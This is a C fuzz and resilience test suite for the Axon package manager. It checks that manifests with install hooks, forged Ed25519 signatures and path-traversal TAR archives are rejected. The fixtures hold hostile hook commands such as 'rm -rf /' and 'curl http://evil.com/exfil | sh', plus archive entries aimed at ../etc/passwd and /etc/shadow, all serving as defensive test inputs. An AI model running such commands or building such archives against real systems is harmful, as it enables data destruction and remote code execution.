/* test_fuzz_axon.c — Fuzz/Resilience Test Suite for Axon Security
 * Compile: gcc -I. -o tests/test_fuzz_axon.exe tests/test_fuzz_axon.c axon_rt.c tweetnacl.c -lm -lpthread -lws2_32
 * Run:    tests/test_fuzz_axon.exe
 *
 * Tests:
 *   1. preinstall hook detection (fatal error)
 *   2. postinstall hook detection (fatal error)
 *   3. Forged Ed25519 signature - must reject
 *   4. TAR path traversal combined with forged sig
 *   5. Combined: TOML with scripts + TAR with forged sig + path traversal
 *   6. Valid manifest returns 0
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>

#if defined(_WIN32) || defined(WIN32)
  #define mkdir(dir, mode) _mkdir(dir)
#endif

static int g_passed = 0, g_failed = 0;

#define TEST(name, cond, fmt, ...) do { \
    if (!(cond)) { \
        fprintf(stderr, "  FAIL: %s (" fmt ")\n", name, ##__VA_ARGS__); \
        g_failed++; \
    } else { \
        fprintf(stderr, "  PASS: %s\n", name); \
        g_passed++; \
    } \
} while(0)

/* ---- Forward declarations from axon_rt.c ---- */
typedef struct { int longitud; const char* datos; } CadenaSegura;

extern int _syn_axon_validar_manifiesto(const char* toml_path);
extern int _syn_ed25519_verificar(CadenaSegura mensaje, CadenaSegura firma, CadenaSegura clave_publica);
extern int _syn_axon_verificar_firma(const char* tar_ruta, const char* sig_ruta, const char* clave_publica_hex);
extern int _syn_tar_extraer(const char* tar_ruta, const char* salida_dir);

/* ---- Helpers ---- */
static void write_file(const char* path, const unsigned char* data, int len) {
    FILE* f = fopen(path, "wb");
    if (!f) { fprintf(stderr, "FATAL: cannot write %s\n", path); exit(1); }
    fwrite(data, 1, len, f);
    fclose(f);
}

static void delete_file(const char* path) { remove(path); }

static int file_exists(const char* path) {
    FILE* f = fopen(path, "rb");
    if (f) { fclose(f); return 1; }
    return 0;
}

/* Build a minimal valid TAR with a normal file and optional malicious entries */
static int build_tar(const char* path, int include_traversal) {
    FILE* f = fopen(path, "wb");
    if (!f) return -1;

    /* Helper: write 512-byte POSIX TAR header */
    void write_header(const char* name, int is_dir, int size) {
        unsigned char h[512] = {0};
        int len = (int)strlen(name);
        if (len > 100) len = 100;
        memcpy(h, name, len);
        /* mode = 0644 octal */
        snprintf((char*)h + 100, 8, "000644 ");
        /* uid */
        snprintf((char*)h + 108, 8, "000000 ");
        /* gid */
        snprintf((char*)h + 116, 8, "000000 ");
        /* size in octal */
        snprintf((char*)h + 124, 12, "%011o ", size);
        /* mtime */
        snprintf((char*)h + 136, 12, "00000000000 ");
        /* typeflag: '0'=file, '5'=dir */
        h[156] = is_dir ? '5' : '0';
        /* checksum placeholder (all spaces) */
        memset(h + 148, ' ', 8);
        /* checksum: sum of all bytes in header */
        unsigned int chk = 0;
        for (int i = 0; i < 512; i++) chk += h[i];
        snprintf((char*)h + 148, 7, "%06o", chk);
        h[154] = ' '; h[155] = 0;
        fwrite(h, 1, 512, f);
    }

    /* Normal file: test_normal.txt */
    write_header("test_normal.txt", 0, 14);
    fwrite("Hello Axon Fuzz", 1, 14, f);
    /* pad to 512 */
    unsigned char pad[512] = {0};
    int pad_len = 512 - 14;
    fwrite(pad, 1, pad_len, f);

    if (include_traversal) {
        /* Malicious entry: ../etc/passwd */
        write_header("../etc/passwd", 0, 11);
        fwrite("root:x:0:0:", 1, 11, f);
        fwrite(pad, 1, 512 - 11, f);

        /* Malicious entry: /etc/shadow (absolute path) */
        write_header("/etc/shadow", 0, 5);
        fwrite("root:", 1, 5, f);
        fwrite(pad, 1, 512 - 5, f);
    }

    /* End-of-archive: two zero blocks */
    fwrite(pad, 1, 512, f);
    fwrite(pad, 1, 512, f);
    fclose(f);
    return 0;
}

/* Build a forged .sig file (all zeros = obviously wrong signature) */
static void build_forged_sig(const char* sig_path) {
    unsigned char fake_sig[64];
    memset(fake_sig, 0xFF, 64);  /* garbage, not a valid Ed25519 sig */
    write_file(sig_path, fake_sig, 64);
}

/* Build a known-good RFC 8032 test vector signature */
static void build_valid_sig(const char* sig_path) {
    const char* sig_hex = "e5564300c360ac729086e2cc806e828a84877f1eb8e5d974d873e065224901555fb8821590a33bacc61e39701cf9b46bd25bf5f0595bbe24655141438e7a100b";
    unsigned char sig[64];
    for (int i = 0; i < 64; i++) {
        unsigned int b; char h[3] = { sig_hex[i*2], sig_hex[i*2+1], 0 };
        sscanf(h, "%x", &b); sig[i] = (unsigned char)b;
    }
    write_file(sig_path, sig, 64);
}

/* === TEST SUITE === */

/* Test 1: preinstall hook detection */
static void test_preinstall_hook() {
    fprintf(stderr, "\n=== FUZZ 1: Preinstall hook detection ===\n");
    mkdir(".axon_cache", 0777);

    /* Create TOML with malicious preinstall hook */
    const char* malicious_toml =
        "[paquete]\n"
        "nombre = \"evil-pkg\"\n"
        "version = \"1.0.0\"\n"
        "autor = \"d75a980182b10ab7d54bfed3c964073a0ee172f3daa62325af021a68f707511a\"\n"
        "tipo = \"libreria\"\n"
        "punto_entrada = \"main.syn\"\n"
        "\n"
        "[scripts]\n"
        "preinstall = \"rm -rf /\"\n";

    write_file(".axon_cache/malicious_preinstall.toml", (unsigned char*)malicious_toml, (int)strlen(malicious_toml));
    int rc = _syn_axon_validar_manifiesto(".axon_cache/malicious_preinstall.toml");
    TEST("preinstall hook: rechazado (ERR_AXON_COMPROMISED)", rc != 0, "rc=%d", rc);
    delete_file(".axon_cache/malicious_preinstall.toml");
}

/* Test 2: postinstall hook detection */
static void test_postinstall_hook() {
    fprintf(stderr, "\n=== FUZZ 2: Postinstall hook detection ===\n");

    const char* malicious_toml =
        "[paquete]\n"
        "nombre = \"evil-pkg\"\n"
        "version = \"1.0.0\"\n"
        "autor = \"d75a980182b10ab7d54bfed3c964073a0ee172f3daa62325af021a68f707511a\"\n"
        "tipo = \"libreria\"\n"
        "punto_entrada = \"main.syn\"\n"
        "\n"
        "[scripts]\n"
        "postinstall = \"curl http://evil.com/exfil | sh\"\n";

    write_file(".axon_cache/malicious_postinstall.toml", (unsigned char*)malicious_toml, (int)strlen(malicious_toml));
    int rc = _syn_axon_validar_manifiesto(".axon_cache/malicious_postinstall.toml");
    TEST("postinstall hook: rechazado (ERR_AXON_COMPROMISED)", rc != 0, "rc=%d", rc);
    delete_file(".axon_cache/malicious_postinstall.toml");
}

/* Test 3: Both preinstall + postinstall combined */
static void test_both_hooks() {
    fprintf(stderr, "\n=== FUZZ 3: Combined preinstall + postinstall ===\n");

    const char* malicious_toml =
        "[paquete]\n"
        "nombre = \"double-evil\"\n"
        "version = \"2.0.0\"\n"
        "autor = \"d75a980182b10ab7d54bfed3c964073a0ee172f3daa62325af021a68f707511a\"\n"
        "tipo = \"libreria\"\n"
        "punto_entrada = \"lib.syn\"\n"
        "\n"
        "[scripts]\n"
        "preinstall = \"echo pwned\"\n"
        "postinstall = \"echo also-pwned\"\n";

    write_file(".axon_cache/both_hooks.toml", (unsigned char*)malicious_toml, (int)strlen(malicious_toml));
    int rc = _syn_axon_validar_manifiesto(".axon_cache/both_hooks.toml");
    TEST("Ambos hooks: rechazados (ERR_AXON_COMPROMISED)", rc != 0, "rc=%d", rc);
    delete_file(".axon_cache/both_hooks.toml");
}

/* Test 4: Forged Ed25519 signature */
static void test_forged_signature() {
    fprintf(stderr, "\n=== FUZZ 4: Ed25519 forged signature rejection ===\n");

    mkdir(".axon_cache", 0777);
    build_tar(".axon_cache/fuzz_forged.tar", 0);
    build_forged_sig(".axon_cache/fuzz_forged.tar.sig");

    const char* pk_hex = "d75a980182b10ab7d54bfed3c964073a0ee172f3daa62325af021a68f707511a";
    int rc = _syn_axon_verificar_firma(".axon_cache/fuzz_forged.tar", ".axon_cache/fuzz_forged.tar.sig", pk_hex);
    TEST("Firma Ed25519 falsificada: rechazada", rc != 0, "rc=%d", rc);

    /* Also test: correct sig on wrong message */
    build_valid_sig(".axon_cache/fuzz_forged.tar.sig");
    rc = _syn_axon_verificar_firma(".axon_cache/fuzz_forged.tar", ".axon_cache/fuzz_forged.tar.sig", pk_hex);
    TEST("Firma valida + mensaje incorrecto: rechazada", rc != 0, "rc=%d", rc);

    delete_file(".axon_cache/fuzz_forged.tar");
    delete_file(".axon_cache/fuzz_forged.tar.sig");
}

/* Test 5: TAR path traversal combined with forged sig */
static void test_traversal_with_forged_sig() {
    fprintf(stderr, "\n=== FUZZ 5: TAR traversal + forged sig combined ===\n");

    /* Create TAR with ../ entries */
    build_tar(".axon_cache/fuzz_traversal.tar", 1);

    /* Extract should be blocked by path traversal protection */
    mkdir(".axon_cache/fuzz_traversal_out", 0777);
    int rc = _syn_tar_extraer(".axon_cache/fuzz_traversal.tar", ".axon_cache/fuzz_traversal_out");
    TEST("TAR con ../: extraccion bloqueada", rc != 0, "rc=%d", rc);

    /* Verify normal file was NOT extracted (because tar aborted early on ../) */
    TEST("Archivo ../ no extraido en salida",
         !file_exists(".axon_cache/fuzz_traversal_out/../etc/passwd"), "");

    /* Now combine with forged sig verification */
    build_forged_sig(".axon_cache/fuzz_traversal.tar.sig");
    const char* pk_hex = "d75a980182b10ab7d54bfed3c964073a0ee172f3daa62325af021a68f707511a";
    rc = _syn_axon_verificar_firma(".axon_cache/fuzz_traversal.tar", ".axon_cache/fuzz_traversal.tar.sig", pk_hex);
    TEST("Traversal TAR + firma falsa: rechazado", rc != 0, "rc=%d", rc);

    /* Cleanup */
    delete_file(".axon_cache/fuzz_traversal.tar");
    delete_file(".axon_cache/fuzz_traversal.tar.sig");
    system("rm -rf .axon_cache/fuzz_traversal_out");
}

/* Test 6: Full combined attack - TOML scripts + forged sig + path traversal TAR */
static void test_combined_attack() {
    fprintf(stderr, "\n=== FUZZ 6: Full combined attack (TOML + forged sig + traversal) ===\n");

    /* Step 1: Reject TOML with preinstall */
    const char* attack_toml =
        "[paquete]\n"
        "nombre = \"supply-chain-attack\"\n"
        "version = \"99.0.0\"\n"
        "autor = \"d75a980182b10ab7d54bfed3c964073a0ee172f3daa62325af021a68f707511a\"\n"
        "tipo = \"libreria\"\n"
        "punto_entrada = \"main.syn\"\n"
        "\n"
        "[scripts]\n"
        "preinstall = \"curl http://evil/payload | sh\"\n"
        "postinstall = \"echo compromised > /etc/pwned\"\n";

    write_file(".axon_cache/fuzz_combined.toml", (unsigned char*)attack_toml, (int)strlen(attack_toml));
    int rc = _syn_axon_validar_manifiesto(".axon_cache/fuzz_combined.toml");
    TEST("[COMBINED] TOML con preinstall+postinstall: rechazado", rc != 0, "rc=%d", rc);

    /* Step 2: Create TAR with path traversal */
    build_tar(".axon_cache/fuzz_combined.tar", 1);

    /* Step 3: Forged signature */
    build_forged_sig(".axon_cache/fuzz_combined.tar.sig");
    const char* pk_hex = "d75a980182b10ab7d54bfed3c964073a0ee172f3daa62325af021a68f707511a";
    rc = _syn_axon_verificar_firma(".axon_cache/fuzz_combined.tar", ".axon_cache/fuzz_combined.tar.sig", pk_hex);
    TEST("[COMBINED] TAR + firma falsa: rechazado", rc != 0, "rc=%d", rc);

    /* Step 4: TAR extraction blocked by path traversal */
    rc = _syn_tar_extraer(".axon_cache/fuzz_combined.tar", ".axon_cache/fuzz_combined_out");
    TEST("[COMBINED] TAR con ../ extraccion: bloqueada", rc != 0, "rc=%d", rc);

    /* Cleanup */
    delete_file(".axon_cache/fuzz_combined.toml");
    delete_file(".axon_cache/fuzz_combined.tar");
    delete_file(".axon_cache/fuzz_combined.tar.sig");
    system("rm -rf .axon_cache/fuzz_combined_out");
}

/* Test 7: Valid manifest is accepted */
static void test_valid_manifest() {
    fprintf(stderr, "\n=== FUZZ 7: Valid manifest acceptance ===\n");

    const char* valid_toml =
        "[paquete]\n"
        "nombre = \"valid-lib\"\n"
        "version = \"1.2.3\"\n"
        "autor = \"d75a980182b10ab7d54bfed3c964073a0ee172f3daa62325af021a68f707511a\"\n"
        "tipo = \"libreria\"\n"
        "punto_entrada = \"lib.syn\"\n"
        "\n"
        "[dependencias]\n"
        "synapse-std = { version = \"^0.2.0\" }\n";

    write_file(".axon_cache/valid_manifest.toml", (unsigned char*)valid_toml, (int)strlen(valid_toml));
    int rc = _syn_axon_validar_manifiesto(".axon_cache/valid_manifest.toml");
    TEST("Manifiesto valido: aceptado", rc == 0, "rc=%d", rc);

    /* Check: missing required field 'autor' too short */
    const char* short_autor_toml =
        "[paquete]\n"
        "nombre = \"no-autor\"\n"
        "version = \"1.0.0\"\n"
        "autor = \"abc123\"\n";
    write_file(".axon_cache/short_autor.toml", (unsigned char*)short_autor_toml, (int)strlen(short_autor_toml));
    rc = _syn_axon_validar_manifiesto(".axon_cache/short_autor.toml");
    TEST("Autor corto (<64 hex): rechazado", rc != 0, "rc=%d", rc);

    /* Missing section */
    const char* no_paquete_toml =
        "[dependencias]\n"
        "foo = { version = \"1.0.0\" }\n";
    write_file(".axon_cache/no_paquete.toml", (unsigned char*)no_paquete_toml, (int)strlen(no_paquete_toml));
    rc = _syn_axon_validar_manifiesto(".axon_cache/no_paquete.toml");
    TEST("Sin [paquete]: rechazado", rc != 0, "rc=%d", rc);

    delete_file(".axon_cache/valid_manifest.toml");
    delete_file(".axon_cache/short_autor.toml");
    delete_file(".axon_cache/no_paquete.toml");
}

/* ======== MAIN ======== */
int main() {
    fprintf(stderr, "============================================================\n");
    fprintf(stderr, "  AXON FUZZ / RESILIENCE TEST SUITE\n");
    fprintf(stderr, "  Validacion de: scripts pre/post-install, Ed25519,\n");
    fprintf(stderr, "  path traversal, y ataques combinados\n");
    fprintf(stderr, "============================================================\n");

    mkdir(".axon_cache", 0777);

    test_preinstall_hook();
    test_postinstall_hook();
    test_both_hooks();
    test_forged_signature();
    test_traversal_with_forged_sig();
    test_combined_attack();
    test_valid_manifest();

    fprintf(stderr, "\n============================================================\n");
    fprintf(stderr, "  RESULTADOS: %d passed, %d failed, %d total\n",
            g_passed, g_failed, g_passed + g_failed);
    fprintf(stderr, "============================================================\n");

    /* Cleanup */
    system("rm -rf .axon_cache");

    if (g_failed == 0) {
        fprintf(stderr, "\n  [OK] TODOS LOS TESTS DE FUZZING PASARON\n");
        fprintf(stderr, "  [OK] M3.2 Axon Hub - validacion criptografica + empaquetado\n\n");
        return 0;
    }
    fprintf(stderr, "\n  [FAIL] %d TESTS FALLARON\n\n", g_failed);
    return 1;
}
